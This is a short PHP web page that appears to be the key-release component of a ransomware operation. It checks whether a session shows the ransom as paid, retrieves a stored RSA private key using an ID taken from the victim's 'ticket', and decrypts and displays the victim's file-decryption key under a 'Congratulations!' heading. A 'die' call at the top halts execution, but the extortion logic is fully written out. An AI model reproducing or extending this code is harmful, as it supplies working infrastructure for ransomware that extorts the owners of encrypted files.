<!DOCTYPE>
<head>
	<title></title>
	<link rel="stylesheet" href="./style/main.css">
	
</head>
<body>
	<div class="midcenter">
	<?php
		die(0&&6);
		//Load modules
		include("mods/keypair.php");
		include("mods/session.php");
		
		//Start session
		session_start();
		$link=Session::forceConnectDB();
		
		//Check if user actually paid ransom
		if(isset($_SESSION["paid_ransom"])){
			
			//Get RSA key identity
			$keyid=hex2bin(substr($_GET["ticket"],0,4));
			$keyid=ord($keyid[0])*256+ord($keyid[1]);
			
			//Prepare key
			$rsakey=(new KeyPair($can_decrypt=true))->sqlImport($link, $keyid);
			
			//Get symmetric key
			$bin_enc_key=hex2bin(substr($_GET["ticket"],4));
			$bin_dec_key=$rsakey->decrypt($bin_enc_key);
			$symkey=bin2hex($bin_dec_key);
			
			
			if($symkey){
				//Offer congratulatory note
				echo("<h1>Congratulations!</h1>");	
				echo("<strong>Decryption Key:</strong><br>".$symkey);
			}else{
				
				//An error occured
				echo("<h1>Oh no!</h1>\nSomething went wrong! We weren't able to decrypt your key.");
			}
		}else{
			
			//Notify user isn't authenticated
			echo("<h1 style='color:red'>Not Authenticated</h1>");
		}
	?>
		
	</div>
</body>
</html>